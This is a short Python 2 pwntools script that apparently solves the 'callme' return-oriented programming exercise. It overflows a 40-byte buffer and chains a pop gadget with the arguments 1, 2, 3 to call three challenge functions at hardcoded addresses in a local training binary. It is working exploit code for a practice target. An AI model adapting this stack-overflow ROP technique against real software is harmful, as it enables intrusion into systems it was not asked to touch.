from pwn import *

pop_rdi_rsi_rdx = 0x0000000000401ab0 # pop rdi ; pop rsi ; pop rdx ; ret

callme_one_plt   = 0x401850
callme_two_plt   = 0x401870
callme_three_plt = 0x401810

# RIP offset is at 40
rop = "A" * 40

# Call call_me_one(1,2,3)
rop += p64(pop_rdi_rsi_rdx)
rop += p64(1)
rop += p64(2)
rop += p64(3)
rop += p64(callme_one_plt)

# Call call_me_two(1,2,3)
rop += p64(pop_rdi_rsi_rdx)
rop += p64(1)
rop += p64(2)
rop += p64(3)
rop += p64(callme_two_plt)

# Call call_me_three(1,2,3)
rop += p64(pop_rdi_rsi_rdx)
rop += p64(1)
rop += p64(2)
rop += p64(3)
rop += p64(callme_three_plt)

# Start process and send rop chain
e = process('/home/abatchy/Desktop/tmp/callme')
print e.recv()
e.sendline(rop)

# Print output
print e.recvall()
